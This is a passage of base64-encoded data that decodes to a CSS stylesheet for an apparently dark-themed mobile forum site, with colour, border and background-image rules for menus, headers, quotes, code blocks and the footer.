VaMGZ5TW5zRzQ2UXB1Q3dMWiswSmVpSDdRa0c2a21QVGNuc0ZicDRacW83cHpXNDY3b2duclFEaE5Ua1ltZUF4SG8zcXRCVUhOSlVvN0pjaXVXZ2k0Yjk0SE5yaXNpVGRjWWNNRWowWERmZEI5ZGU4NFY3ZTlvV1ZNOEtJWEdXWDkyTktpZmpHQWN2UmRvWUVUTUF3RXVLbnV1Z1kyQUZUZWhuMm9FcHZMYXFRazlwc3FCZ21kVVdOdzNnMjlJRld4S2dveW9FaHlmaXc2TTlCR0UrS0hCbzQ2b21DUHBCMDZnMWVIWDBBT1BxQUdBOXA3Q1pFUnI5MUw0Z1BEeE9NbGdOcElaQ1kyTC96eElSRDdZRWc4T2Z4WDkxT2dXZ3BrRms0YTBKRXg2YU82MTMwemFreE9Zem9NV2hSL05FSW1XRWVVeEFiTGc1WE8vVVo3SG54M2FDNUhpUzJYV3BnTHV3RXlGUnFDWEJ4bjQ5YWtpTHFTMlJXWVBKOXRqNFNjakdZYmZqNDVid0RlVjU2SVI1UGVBOVVIRUc5OVVNcHlJYTJveThDNHZkTkVoRWc2NVlTWSs2MjJPZXlxdUR6bEIvam1WSFk1WlBkMGNBL0R5UXR5QTVGUEJQUmVXU2t1aTNBQnBjU0hKZ2tkVDhSeEUzUG1uQ2RlU0JTMGJyMGtFZzJYRkt5dzBFUy83TVUralZNZTBTWDRlRVFiaHNKK2VqWnZuRDZtODZEME5aRVZlRDFhQS93dFMwUEZqYXRTckZuOStDQTJNRDVwem1lVjlxZDcwTENPbUp1UUxMMVVhSnVvajNBVWNUMFJGNUx1dFo0SVJjWGxHR1h4L2tvL0xpZm9LK1ZFZU9BOW1OVjJ2cFlKWXFLZDNaZG1oUHNNZGVqTUlsaWU1YlR3aXI0Nmplb1JNc04xcFlDSmNuMXFhUHBsaVBWcmpmd2Q5eERFdlg2RkRMWEwva2pnZkdWcHFlNHYrdy9mc2Faa3JiZnJkbyszOGZ2U3kra1Jzbk45Q3RKYTJuZEIxMmdkMEhSd0QwUDQrYVlnZXJadDBMcnB3K3VwOGRHWGgzdW9ZbkZzdWkrdno3ZFgxdmpZZGkzNXFtS1RkY25CZi8wcUYvejdXQW1WRklqRmtYY3RBc3FJUlV2M2hzRmdnSXkrN1MrSTZKK282SkJ1NmtMZ2NseXJ5UGhWMmRLQmtLTEt1a3U5S0pTRExNVFVnQ05MQjMrNlZ5K3Q3WTMwaWordlNOWEdkRnFFTEdiWHpUK1QxY0V3cHdmdWJVR01JOHFDaUl3SU12dzdCRzFST0JHbVEzZFFqY3RTb1FURFBiU0xHOFljNG41OEwwUFZhNW1BSHZGdkVHUkFjZzYrUElZbzRUaU02em9NMU1NZTk2WGMvWWpoZ0h6R1BQK1Q5MUwxSjFnNDFrcmJqaitIKy9UVmpNem9HOThleFBmUTdGNHZXNDVIL1BPSEhUOW5zdHlrZmhUWCtRN3NYQm5UUXN3K1JhY2kzemNVK09nYkJQWmpXNjIxL2ltMWozRmNycDlISFBYUWplY1JVZHJUZzhISFF6WFluWlNxY2g4YzJ5RjJBYnh6UTZJaU13N1Jmd0J5Kyt2ODlTTVBqbEpHN0FOODRqaTZVMlRHUnVFTm0xM0dweVB1TTg1Yko0LzhJdVF2ZzRlR1JIWEVIekYvVzJQSkRqUzArMU5uaVBYQW8xK3AzamMzZkVsN2dHSFdjZVl6OC9ZNk9leXBNVEJ5Ly9FakhmOVNPK1lqcklBRkNYaXQwRGJXdThXUDUrWi9xdEZiWHI3UFpzKzBHQnN4ZjRYbTErMzBRMTUzK1lqZU41ODlyL0xuV1pjVFB0Y2o3UWNvcnkyZE8xMXk4T1dTelg5RzNIdXpQWEx4U1pWbXpYRXV1NWY3bEoxRnVZaHRkOTNXTkRlL0dsOEgwSVpYMUd5bjN1cHlOOS9YQmtQMVRQWENmMGUzZ2dBN1VsY1VIUTA2VTNhOTJlV1pQUkoxWVJOV3Z0eWo3OFBuWWhtdHY3aGNzYnp6WGpPU1pVWDFiMXlmWFBUNkk0L0h1K2ZIdlhQVnZVK2ZWOGNleU93N3ZrWi8zc1dZNWZsTS91Vnd2SkFkZTZSeW95M1dOVFora2NNUGlEcGc5RndYQXZwWVpZNVV3Vm1YK01rR2N4WWNxYlhNYzkyK1pDaFF2VXdpSDQrZnZrRWlPL1NWeDN0OFZObjBtQ243K3JtcS9EbUg1UjRYTjZKNXpGT1NYbXR3dTdqdC9uWDFzN1JDWlA3L2I1WisvZG93K29rbzRmMDE0SHlIdjd5UXZTUG5KT09acmxhMFdWWHFKRlRhNXZ3bCtvY3h4VFR5bjlacGZ5L3grYURoUllkaENsWHVaeXFQQ0JyZmpBMm5qQjNRUGVoOGdNVnRHdkxOWGd1aThyUC9RN2tQUGRLS050aHJlYUxyTDdvMjk3Q2EvZ0FTb3VCSDE1aXRrQ0wvVHhkdUs0NXd5VzN5dThqbzVwVG8ySWFLREtPTDkyTyt4K0NMZXo1VEtmZkpZbFAwaTRuM2llRTUyVWpadDFUWDZ1TTdyTGZ2SDhjN1c1VW5IUFpjY0FMZmVLdzZJY2tWWlRDd05WbVlDQTIxMFJQOEZraFdzbUwyUjJVZ1BxRUwrVzdRZnR5cXl5VlBqUlJaS2JQYXV6UGV2L2k2eTRhUE5pOEt4N0t2OWZvdmZneDM0aytjVklvSzQ3L1NWdmJJa3dld0Z2YlQvN1BJdmZzTVFTamN4cGk4cXp2SlovQ2JrN2Yyd2tUT0lJalZZS01OTjhrQzFRR1grdTZQTXZ4YlorSWw4emtLUjlYK2lTdlZabENQT09VNFJTT3YvUU8vc0gvdDlsdjhVV2UvMjVwMTBTZU11UHNuNy9GRmk3WXQxcmRHaHNsdTZ5Kzc0d0YxMnc0ZXVjcEZ5NFB4TG02bHIrbGNQWldOaFAyZitJUnlIU1BKK0FzZS9qRGorc3ozbm41ZkRtN0x6UE5Ubm1kbVlGVXBjWHM2ajkyVjI1QmltdWhXQlVVblVUWlFnSzdsV0w3TjFwY2JxNTh1eVlNWDIxZGZOOGZ6QlA2S2ZNdmdpSnlnb3FwQWdZYkRBcTV6MG9YdktTbXJLT0tJS3paYWxyUWk4ZUZ0ZFZ3cjkrZmgvcXN5alIyNWk0TDZCNDcrR0swZ1BaRkVWMVNpYjVaOGxkbkpyVXpZZEl1R2F3RVo1czFXQmpZM3lPcm9rQ0wrZzhqKytrcHpBdzUrcm5LZzJ1VUhzay90QjdkYzhxUEI3NEowZkhXejJ6Yld5WTJiWjBUT1BIUzRJbCtFeFdTbWZpY1QvMmNzUFNtR2ltWlZvTEpaa3pheFc5dU50Qko2OUZ2WE0rbjQrTzQ1WHgxb2FKTmV6ZEc1VStidDBjWURYbzRmQnNwaS9GN3c1dXB5aDdpWTljUHhFMDA2R1pseFJ5OHZ0OW9Kb1ljeVhxQXBnOVJkcDJSOU40ZW5sZlNtemh2RkI2dGxMcmNETmh1Q1BEWUdoTlpWSnN2aFlEcmR3U1ovdlovanlodGJUR2czUmVyck5jL0hDSGZKK0VmSU83dGNDQk5Zcnh2THZZTm4wa0Q5cnlMSXVTMWd6TDhSem52d0FVN2pHMnRjcnZCRkVaVHkra2R5TkdCR3gxaHJZYkZTb3NnMWxaWU81eTh1WjNqSHVqVXJja2dOWVVDRVh2T3pLOWdZSHBIcnJmaTljYmxrUFREbFVHV0gvdXM2UW00VDdyUWxzeUQzL0dMNlhUc2pRKzdFUWt0ZGprM3dSeCtzSWFIdjl2YW56UDFSWXRkQmVsOTJTM3RudzE0eUtKK21Cbld0VjN1cUd0Sk1xdFBmU2pINVVDWnJST3RtcDRrMWZiaXJYNE1jNmYyblF3cUZDQUlFMURSeW83Sm9HaGkvRXpjL1BRbXNEV1FvQ2xRSysxalRpUmNPVTZ4ellaeUVVTGJ6UllLbks5NlVjSnJCUk5pamI0MnNHZ2Y4b0I1OWQwOEJUV1daajhwMWgyY0E2T0hrQTM2ektqdThtTDRQeG95clhDclp5WG1rRTV2NGFWYndXUmoyUnF6U2o5OWk2TG1UZ1pVZlBQN0dablY4M1pYQjh5ZTdiNFozTjZkcmNpakhsVUdWS0x0eUFHcXN4K1pwb0RGQ1BtSzZCdFh0YU5mQ2JpUGRqSWVUOGpkWWdHKzhxanNDdHE5V0FKUnBTZUl2aU9sQ0ZoZ25jS1JYMlRHRHVyNzROVnU0QXFhaUF1emVyckZHdXJJVmZXWTZGbHF3VUd1c1hEd0lmMzdhMG1EcUJJelR3NGxPRlh6UFR3MHNjaysrSkZuMU1mdmZKL1dBREZEUXAzYVpnRWcxOGNtZEQ0Slh4VWxGNWk0WE5jL1U1Z1V2V0NxQnJZRmdnS08vUno5Q09RaXVXRDVJUDNoY2EyR0hXZzhBUHF1dDN4Ylg3ZGZHL1hwUmxYdWlLc250V1liMTdSQ3JIODNFeitGZEgyVUdqVXlNMHVBOFh3L0hNc0lCZWlVWVdza0JydXl5MHVhVStDQUk3M28vRkI1NWJDQitsc1UxTW5tM3FyMUo0QVMxTVpUbCtXT2V1dytpWDdHNWZxb05IdnhpQkNyMlF5YnllUGhkRDk2WVc4Mk5kS1lqb3czdW9iRjF1T3N6ZU9hSzdMOTArQ3pUdytGR2R2M1FVa3Mxa1NvTXB1ZzZvRlR5K1U2RUdxQm8yNWZUVzNXR2k2eG80MUdJVHdhYm9ZdmtjMUJvZ1BDcnNsQnJHcGhHODBEV3crZkpoT3ZLS2pHNkl2OHE4VVJqK2xLMzdiUFJvRThRS1ZEUW1mT0FoV1ExVDBucnc2M2pnNmxLUWhJamFvdXdRU0t1ZEU2YTFxNUYzbWRHY3dOUVF0ekNwd1NkM3JBWFhob1V4ZWx4bGVwQXBaSzQ3Q2V4NFAwNE5iRmdCNitQZFFTeUZ4c1VLYjdoZDlRanZEQllObEdLaEVIKzluUkM0ZWJIS0k4Q0JoOUlMNHFPSXBQSUFsSzY1RE8wQjgyZnlSQkJsK0xQanBSb210TmtJb0o4T1hWZ3VreWtOVUxIZy93Ykk2TEFnSUhQM1N0aU0xald3R2JpQWhrUzNCcnBlTnZ0eExKSGlTMVVFeDR5WDJJdlV3QVhlM2JEOHZicTJEQVkvWlV2aGpOTEFvcEpodjNnMk5Kd21nZWR2cXB5WXBZSWM3L3pLVFJTVVErOWFPQm9OS3dKV1ZQTnloVnRCWnZCU1Z4TEtGeGIzQ2RZUFZlNUpDR3cyREZZQzAvVkQ3a3RDRGN6TDlySFJxMkVHZnhHNC9ISExLWVhUbmhBSVVsbUlkWEtuemd0NTlXYzRJTEZ1SVlsdzhGdngwbHkyLzlRd29mVkdBSTNJOFkwYWo4UWk4cndOZ1U4d0Y5ZTdTaUFLSHVnT3MvZ3ZhSHlzQkRhUFZmTEtiZ2RFZE1QeGdTSi9odG5MNERYN3BnK3Nsd0dWQzB6V1BwbXM4QzJoS1RNVCtGRkVOeEtlbGF5VDZSdmhKL1BlQnUyckN1Z2FFbVczMmRiL01helIxK1VCTS9xcHBleGVDaE82YzZ2QzJsYzNzUmJiTmFheVB6NFFjekRLM2UwRHUzemFzQWEwQldPalRHNGI2dWMyM1c3bWM2aDZ2QlY1c3hCNDhCQ1YwT2plMERRRGI1R0p3RENuclpXUGlZREU4cmNLcjRUT2h1SmxSSUZyRDg0Ymd3OHltSUtraXBmcFdqUWtqc0NVbWRDNTZHU0hXUXFOdVBoaTZRNVRGZVM5SzhycDhySGtmTmQzcTg0b05JN3BYdDFvSjZzRzFvSllJMWwyOE5saEZReVVyL3BjWk1VbEp2QXZHdUVzWFI0Z0ZTK25WeFZlSmkydHEyUDZYSldkVEw2aDhvTXZialdqbFhiOFlDazdhVUwzcERaYWs4Y285K1hmSllaKzZ3MkI3ZlZqbHhwWWI0ampORERLZmY0OFdQWTJpeUtxTzNUdkJHNWNxUEpvckt0MVl1VFQ4WURHRDhIb3BxMVNOeSs1eVJhS1Focys4T2E0NnRxM2dsK0lpcERtZVdBSkxKRzU4MGFrMFBHMDBMZDFtVFVWbEh0VDhDQmIwT2NNUmFFdExUeVBRdHZLaElrb2RFL0xiQXI0d0laRzE0Tlk3ZXRWYnZFTXVSbmU1b1NhTytJS1ZnSS9Dc3UwOFlHTDYzN2c0UzlWb1NWdmJxNk5IZ0JlZG05RnVhbnk0NWxWRnN0TFBlZko3V0RaVFY5VVpSQkx6dTc1d043UTZacDE5cnJxTE8rNEtIUllBeWYwZ1dNMHNJb282OXQ0TU12c2ZsWFh5WVBBdk1EMVRtN0xDMnBlcWJEYStYSmtRTVBXZFJRb2NOTUhkbWhnYUJBVmtsOStFZ2tHU1o5amdKa3hQNHR1ck00Tnd1MEtqNGlqa2dZcWtma2l5UlNjUHEyRkNXeG9ZRnMzaGU1dkJ2d2hlcVphWVZPeDlTaTBxUmw1TjVJazhCR1ZOY3hTYUhkRWVWZWtwYUw2WEVNRTFqUndpR3dJWWowVUJJYmxCVisxZlYwOHk4bWxKbytrUWpPM2I0aHlPNFlKZkxQQ1NlOHlveEVFblQ0TE50eGNBNk12OU9GbSsrS1RrZEZFSkJnOXFiREk4azRhaFE1cDRBUlI2QmpDais4ZGl0aU1FVkRsZmNML0dmZk5Vd1B6bDNtLzZ1elBWSnBoVThqaE1EeWNkMldhT1JzSkk1SER6UHdLdlNDcVhFZ293YldUUGdkUG5TVC8wOWFZVkFybHRSbHRObEs4a3ZEVVJ4WjhWbWNMTHpPeDdyaFRVbkd2eWFOTm5xd1poUTVVQUdoZ1ErWnUrVkJhUmtRUVMrNndrOENXS1BUNlhsby9zS2dzV2dJTnljbklsWnBheXE2SXN2dHNTWWhSQk9NNUE1dVpQT1p2aEF4anJadUpheTZOY0dpMFcxZU11bVVFc2RidlptZFJhSHNjeENUOCtIcURucmV5ZWJZQWdTMEpVSGxyNENwL1FVWVhoeVJtKy9ybUFkQ2kybkpja1MrSzlNeElBcit3UktFdEduaGNhdkorUVZVSmsycmdFYlN2aktoems4c1lFY1JsaUVpUHhMbWRDM1VyZ1VNdHRrclZJd0xvbWlYUXgveTNpQXNvYTZKUkNHWmlCUm9SMHNCNjBHMzZTUFFuaXZkUlRKVk9pbjVlTXdxdDdvWHNzSUVsU2pvb04za2w1cy8yQ1dVWDdzSkNRKzZNUmxNOTZWK1gvajV0VW5WSjc2STd2aGxzN0tiR1lKS1o5bTVNQzhXWlNtazJLT3YzWTFFSVNkN25aekVLQ2U4dDBMRHJkZWk1b1lFZGx1U3BFbmpkc3NpdUVMRU9WNXptUVZWcXNjMXhDSUNoejlCMTNmblRPZytHaU56YWtuRVBlWTAveGNnbVBxVHdkelhLUkhiTEpDRHc3S21xOFBLNlgwdmNiOE1vRkl3dTRzYzhGNk5UMkg4bDQvNmJjL2dvckNkUzNuZlY0SDd0TjN6bXliTTZneGtLWHhKa1ZXVW1YcWI0amY3c0kzeVQ1MFdkUTJqZzhQTmpqZkxCa01UbFp6VUNaclBQcGhWREJQdFpCT3d3Q2tlTVJyTGNoMGZINjJKa3oyTVpQS0t5NC8zWlJ0a3RxT3htVDJyQnNsdVdIR1ZTNG8zdVpnU2IzUDl2V1F4UGZTbmV3Znl0MUlLb00vZGxuT09aQ0phSjBVWDI4b1kyeFAxbnordDhlS0Q3L2NnNmczNTZPaFpCS1BFK2EzSTBrdnQ5enQ2QXVIVE12M3JaRjljRW5qOFR3dzJqNnZHUzZqRkdUUEg3L1J5ZVcyeXZCTzdkcS9CQ21XTmNKTVk0dmtNS1g3amlUSjdoR0hwWjhqaVlkNVZ6N200ZlhvQVlLb2lBQ0Q5UDNDT3cxb2JTTFg1RDU3KzR4NXdxVWxTKzhycnhRZUxHQisyOFQxVkI0RGUxOVZBdTVCZno0TXg3SmJ1eC9pU081eFZFeWp2N1dBMGZwK1NsWTFSQ1BrOUYvSUErZFNTK1kxM2hHa1paTHp5YStWWU00ZVBQcEs2ekxvZnFlajhmT3ZkWlBydTgvL2h4Z2pKNHFCb2V5N1Bwc3I4Vno2Y2F0blhaZlpUNFZGMlhoVHFHeTQreWVSOThmK3RycXJKN0p0NGgvOCt2VlJIN1g4bHllbGpoMjNXWGdBOURWUUhIaitINndXVi9KNGRBa2h3WWk3eXVUODczbzhhMDE3bE04emYxOWZFem85ejVXdGI3UU5uTE1wbEkvejVjankxcldZL3h2Sk9IR2VkU3kwcGdEdytQTTREY0JmRHc4TWlPM0FYdzhQRElqdHdGOFBEd3lJN2NCZkR3OE1pTzNBWHc4UERJanR3RjhQRHd5STdjQmZEdzhNaU8zQVh3OFBESWpQOEJEZURNLzNZWS9HWUFBQUFBU1VWT1JLNUNZSUk9KTsgYmFja2dyb3VuZC1yZXBlYXQ6bm8tcmVwZWF0OyBiYWNrZ3JvdW5kLXBvc2l0aW9uOjUwJSB0b3A7IGJvcmRlcjoxcHggc29saWQgIzAwNTA2NDsgYmFja2dyb3VuZC1zaXplOjYwJSA3MCV9DQouYm1lbnUsIC5waGRyLCAuaGRye2NvbG9yOiMwMDg0YjU7IHRleHQtc2hhZG93OiMwMDAgMXB4IDFweCAycHg7IGJhY2tncm91bmQ6dHJhbnNwYXJlbnQgdXJsKGRhdGE6aW1hZ2UvZ2lmO2Jhc2U2NCxpVkJPUncwS0dnb0FBQUFOU1VoRVVnQUFBQUVBQUFBUkNBWUFBQUFjdzhZU0FBQUFZRWxFUVZSNDJnRlZBS3IvQUFCQVVQOEFBRDFNOEFBQU9rbmhBQUEzUmRJQUFETkF3d0FBTUR1MEFBQXNOcVVBQUNjeGxnQUFJeXlIQUFBZkpuZ0FBQm9oYVFBQUZoeGFBQUFTRjBzQUFBNFNQQUFBQ3cwdEFBQUhDUjRBQUFRR0R3a2lEaVNrRnRYUEFBQUFBRWxGVGtTdVFtQ0MpOyBiYWNrZ3JvdW5kLXJlcGVhdDpyZXBlYXQteDsgYmFja2dyb3VuZC1wb3NpdGlvbjo1MCUgdG9wOyBtYXJnaW4tdG9wOjFweDsgbWFyZ2luLWJvdHRvbToxcHg7IHBhZGRpbmc6MnB4OyBib3JkZXI6MXB4IHNvbGlkICMwMDUwNjR9DQouYm1lbnUgYXtjb2xvcjojMDA4NGI1OyBib3JkZXItYm90dG9tOjFweCBkb3R0ZWQgIzAwNDM1NH0NCi5ibWVudSBhOmhvdmVye2NvbG9yOiMyNWM1ZmY7IGJvcmRlci1ib3R0b206MXB4IGRvdHRlZCAjMDA2ODgyfQ0KLmNsaXB7Y29sb3I6IzQ1OWJiMTsgYm9yZGVyOjFweCBzb2xpZCAjM2YzZjNmOyBmb250LXNpemU6eC1zbWFsbDsgcGFkZGluZzo0cHggNHB4IDhweH0NCi5lbmR7dGV4dC1hbGlnbjpjZW50ZXJ9DQouZnVuY3tib3JkZXItbGVmdDo0cHggc29saWQgIzY1OTMwMDsgY29sb3I6Izc1NzU3NTsgZm9udC1zaXplOngtc21hbGw7IG1hcmdpbi10b3A6NHB4OyBtYXJnaW4tbGVmdDoycHg7IHBhZGRpbmctbGVmdDo0cHg7IGJvcmRlci10b3A6MXB4IGRvdHRlZCAjNGY0ZjRmfQ0KLmdtZW51e2NvbG9yOiM3NWJmMDA7IGJhY2tncm91bmQ6dHJhbnNwYXJlbnQgdXJsKGRhdGE6aW1hZ2UvZ2lmO2Jhc2U2NCxpVkJPUncwS0dnb0FBQUFOU1VoRVVnQUFBQUVBQUFBUkNBWUFBQUFjdzhZU0FBQUFZRWxFUVZSNDJnRlZBS3IvQURKSkFQOEFNRVlBOEFBdFFnRGhBQ3MvQU5JQUtEc0F3d0FsTmdDMEFDSXhBS1VBSGkwQWxnQWJLQUNIQUJnakFIZ0FGQjRBYVFBUkdRQmFBQTRVQUVzQUN4QUFQQUFJREFBdEFBWUlBQjRBQXdVQUQrSytEVjhUUVp4a0FBQUFBRWxGVGtTdVFtQ0MpOyBiYWNrZ3JvdW5kLXJlcGVhdDpyZXBlYXQteDsgYmFja2dyb3VuZC1wb3NpdGlvbjo1MCUgdG9wOyBtYXJnaW4tdG9wOjFweDsgbWFyZ2luLWJvdHRvbToxcHg7IHBhZGRpbmc6MnB4OyBib3JkZXI6MXB4IHNvbGlkICM0MTVmMDB9DQouZ21lbnUgYXtjb2xvcjojNzViZjAwOyBib3JkZXItYm90dG9tOjFweCBkb3R0ZWQgIzIyMzIwMH0NCi5nbWVudSBhOmhvdmVye2NvbG9yOiM5NmY0MDA7IGJvcmRlci1ib3R0b206MXB4IGRvdHRlZCAjMzk1NDAwfQ0KLmdyYXl7Y29sb3I6IzU4Njc3Nn0NCi5ncmVlbntjb2xvcjojNThhNDAwfQ0KLmxvZ297bWFyZ2luOjFweDsgcGFkZGluZzoxcHg7IGNvbG9yOiNiOTQyMDE7IHRleHQtYWxpZ246Y2VudGVyOyBiYWNrZ3JvdW5kOnRyYW5zcGFyZW50IHVybChkYXRhOmltYWdlL2dpZjtiYXNlNjQsaVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQUFFQUFBQVNDQVlBQUFDYVY3UzhBQUFBWlVsRVFWUjQyZ0ZhQUtYL0FBSUJBQUFBQlFNQURnQUlCQUFjQUFzR0FDb0FEd2dBT0FBVENnQkdBQmNOQUZVQUhBOEFZd0FnRVFCeEFDVVVBSDhBS1JZQWpRQXVHUUNiQURJYkFLb0FOaDBBdUFBNkh3REdBRDBoQU5RQVFDTUE0Z0JFSkFEd1d1Z01MbWVFaC84QUFBQUFTVVZPUks1Q1lJST0pOyBiYWNrZ3JvdW5kLXJlcGVhdDpyZXBlYXQteDsgYmFja2dyb3VuZC1wb3NpdGlvbjo1MCUgYm90dG9tOyBtYXJnaW4tdG9wOjFweDsgbWFyZ2luLWJvdHRvbToxcHg7IHBhZGRpbmc6MnB4OyBib3JkZXItdG9wOjFweCBzb2xpZCAjNWMyOTAxOyBib3JkZXItYm90dG9tOjFweCBzb2xpZCAjNWMyOTAxOyBib3JkZXItbGVmdDoxcHggc29saWQgIzVjMjkwMTsgYm9yZGVyLXJpZ2h0OjFweCBzb2xpZCAjNWMyOTAxfQ0KLmhlYWRlcnttYXJnaW46MXB4OyBwYWRkaW5nOjFweDsgYmFja2dyb3VuZDp0cmFuc3BhcmVudCB1cmwoZGF0YTppbWFnZS9naWY7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFBRUFBQUFUQ0FZQUFBQlJDMmNaQUFBQWFrbEVRVlI0MmdGZkFLRC9BRUpDUXY4QVFFQkE4UUErUGo3a0FEczdPOVlBT1RrNXlRQTFOVFc3QURJeU1xNEFMaTR1b1FBckt5dVRBQ2NuSjRZQUl5TWplQUFmSHg5ckFCd2NIRjBBR0JnWVVBQVZGUlZEQUJFUkVUVUFEdzhQS0FBTURBd2FBQW9LQ2cxcDNCS0N5cG5TR1FBQUFBQkpSVTVFcmtKZ2dnPT0pOyBjb2xvcjojYTlhOWE5OyB0ZXh0LXNoYWRvdzojMDAwIDFweCAxcHggMnB4OyAgYmFja2dyb3VuZC1yZXBlYXQ6cmVwZWF0LXg7IGJhY2tncm91bmQtcG9zaXRpb246NTAlIHRvcDsgbWFyZ2luLWJvdHRvbToxcHg7IHBhZGRpbmc6MnB4OyBib3JkZXI6MXB4IHNvbGlkICMzMzN9DQouZm9vdGVye21hcmdpbjoxcHg7IHBhZGRpbmc6MXB4OyBiYWNrZ3JvdW5kOnRyYW5zcGFyZW50IHVybChkYXRhOmltYWdlL2dpZjtiYXNlNjQsaVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQUFFQUFBQVRDQVlBQUFCUkMyY1pBQUFBYWtsRVFWUjQyZ0ZmQUtEL0FFSkNRdjhBUUVCQThRQStQajdrQURzN085WUFPVGs1eVFBMU5UVzdBREl5TXE0QUxpNHVvUUFyS3l1VEFDY25KNFlBSXlNamVBQWZIeDlyQUJ3Y0hGMEFHQmdZVUFBVkZSVkRBQkVSRVRVQUR3OFBLQUFNREF3YUFBb0tDZzFwM0JLQ3lwblNHUUFBQUFCSlJVNUVya0pnZ2c9PSk7IGNvbG9yOiM3ODc4Nzg7IHRleHQtc2hhZG93OiMwMDAgMXB4IDFweCAycHg7ICBiYWNrZ3JvdW5kLXJlcGVhdDpyZXBlYXQteDsgYmFja2dyb3VuZC1wb3NpdGlvbjo1MCUgdG9wOyBtYXJnaW4tYm90dG9tOjFweDsgcGFkZGluZzoycHg7IGJvcmRlcjoxcHggc29saWQgIzMzM30NCi5mb290ZXIgYTpsaW5re2NvbG9yOiNhOWE5YTk7IHRleHQtZGVjb3JhdGlvbjpub25lOyBib3JkZXItYm90dG9tOjFweCBkb3R0ZWQgIzNmM2YzZn0NCi5mb290ZXIgYTpob3Zlcntjb2xvcjojZDJkMmQyOyB0ZXh0LWRlY29yYXRpb246bm9uZTsgYm9yZGVyLWJvdHRvbToxcHggZG90dGVkICM2OTY5Njl9DQoubGVmdHtmbG9hdDpsZWZ0fQ0KLmxpc3QxLCAuYntiYWNrZ3JvdW5kLWNvbG9yOiMxMDEwMTA7IG1hcmdpbi10b3A6MXB4OyBtYXJnaW4tYm90dG9tOjFweDsgcGFkZGluZzoycHg7IGJvcmRlcjoxcHggc29saWQgIzMyMzIzMn0NCi5saXN0MntiYWNrZ3JvdW5kLWNvbG9yOiMyMTIxMjE7IG1hcmdpbi10b3A6MXB4OyBtYXJnaW4tYm90dG9tOjFweDsgcGFkZGluZzoycHg7IGJvcmRlcjoxcHggc29saWQgIzMyMzIzMn0NCi5je2JhY2tncm91bmQtY29sb3I6IzA0MDQwNDsgbWFyZ2luLXRvcDoxcHg7IG1hcmdpbi1ib3R0b206MXB4OyBwYWRkaW5nOjJweDsgYm9yZGVyOjFweCBzb2xpZCAjMzIzMjMyfQ0KLnNob3V0e2JhY2tncm91bmQtY29sb3I6IzA0MDQwNDsgbWFyZ2luLXRvcDoxcHg7IG1hcmdpbi1ib3R0b206MXB4OyBwYWRkaW5nOjJweDsgYm9yZGVyOjFweCBzb2xpZCAjMzIzMjMyfQ0KLm1haW50eHR7cGFkZGluZy1yaWdodDoxcHg7IHBhZGRpbmctbGVmdDoxcHg7IGJvcmRlcjoxcHggc29saWQgIzNiM2IzYn0NCi5tZW51LCAubmV3c3tiYWNrZ3JvdW5kOnRyYW5zcGFyZW50IHVybChkYXRhOmltYWdlL2dpZjtiYXNlNjQsaVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQUFFQUFBQVFDQVlBQUFEWG54VzNBQUFBVzBsRVFWUjQyZ0ZRQUsvL0FBUUVCQUFBQndjSER3QUtDZ29mQUEwTkRTOEFFQkFRUHdBVUZCUlBBQmdZR0Y4QUhCd2Nid0FnSUNCL0FDUWtKSThBSnljbm53QXJLeXV2QUM0dUxyOEFNakl5endBMU5UWGZBRGMzTis5UHFRMEdrNDNON3dBQUFBQkpSVTVFcmtKZ2dnPT0pOyBiYWNrZ3JvdW5kLXJlcGVhdDpyZXBlYXQteDsgYmFja2dyb3VuZC1wb3NpdGlvbjo1MCUgYm90dG9tOyBtYXJnaW4tdG9wOjFweDsgbWFyZ2luLWJvdHRvbToxcHg7IHBhZGRpbmc6MnB4OyBib3JkZXI6MXB4IHNvbGlkICMzNTM1MzV9DQoucGhwY29kZXtjb2xvcjojMDA3OThmOyBiYWNrZ3JvdW5kLWNvbG9yOiMwMDExMTQ7IGJvcmRlcjoxcHggZG90dGVkICMwMDI3MmU7IG1hcmdpbi10b3A6NHB4OyBwYWRkaW5nOjAgMnB4fQ0KLnF1b3Rle2JvcmRlci1sZWZ0OjRweCBzb2xpZCAjNWM1YzVjOyBjb2xvcjojNTg2Nzc2OyB0ZXh0LXNoYWRvdzojMDAwIDFweCAxcHggMnB4OyBmb250LXNpemU6eC1zbWFsbDsgcGFkZGluZzoycHggMCAycHggNHB4OyBtYXJnaW4tbGVmdDoycHh9DQoucmVkLCAucmVkIGE6bGluaywgLnJlZCBhOnZpc2l0ZWR7Y29sb3I6I2QyMDAwMH0NCi5yZXBseXtib3JkZXItbGVmdDo0cHggc29saWQgI2NhMDAwMDsgY29sb3I6I2RiMDAwMDsgcGFkZGluZzoycHggMCAycHggNHB4fQ0KLnJtZW51LCAuYWxhcm17Y29sb3I6I2JkMDAwMDsgYmFja2dyb3VuZDp0cmFuc3BhcmVudCB1cmwoZGF0YTppbWFnZS9naWY7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFBRUFBQUFSQ0FZQUFBQWN3OFlTQUFBQVlFbEVRVlI0MmdGVkFLci9BRTBCQWY4QVNnRUI4QUJHQVFIaEFFSUJBZElBUGdFQnd3QTVBUUcwQURRQkFhVUFMd0VCbGdBcUFRR0hBQ1VCQVhnQUlBQUFhUUFiQUFCYUFCWUFBRXNBRVFBQVBBQU5BQUF0QUFrQUFCNEFCUUFBRDR1TUM5R2tXSDhhQUFBQUFFbEZUa1N1UW1DQyk7IGJhY2tncm91bmQtcmVwZWF0OnJlcGVhdC14OyBiYWNrZ3JvdW5kLXBvc2l0aW9uOjUwJSB0b3A7IG1hcmdpbi10b3A6MXB4OyBtYXJnaW4tYm90dG9tOjFweDsgcGFkZGluZzoycHg7IGJvcmRlcjoxcHggc29saWQgIzU5MDAwMH0NCi5zdGF0dXN7Y29sb3I6IzNmYTQwMDsgdGV4dC1zaGFkb3c6IzAwMCAzcHggM3B4IDRweDsgZm9udC13ZWlnaHQ6Ym9sZDsgZm9udC1zaXplOngtc21hbGw7IHBhZGRpbmctbGVmdDowfQ0KLnN1Yntib3JkZXItdG9wOjFweCBkb3R0ZWQgIzRiNGI0YjsgZm9udC1zaXplOngtc21hbGw7IG1hcmdpbi10b3A6NHB4fQ0KLnN1YiBhOmxpbmssIC5zdWIgYTp2aXNpdGVke3RleHQtZGVjb3JhdGlvbjpub25lfQ0KLnRtbiwgLmZtZW51e21hcmdpbjoxcHg7IHBhZGRpbmc6MXB4OyBjb2xvcjojYjk0MjAxOyB0ZXh0LXNoYW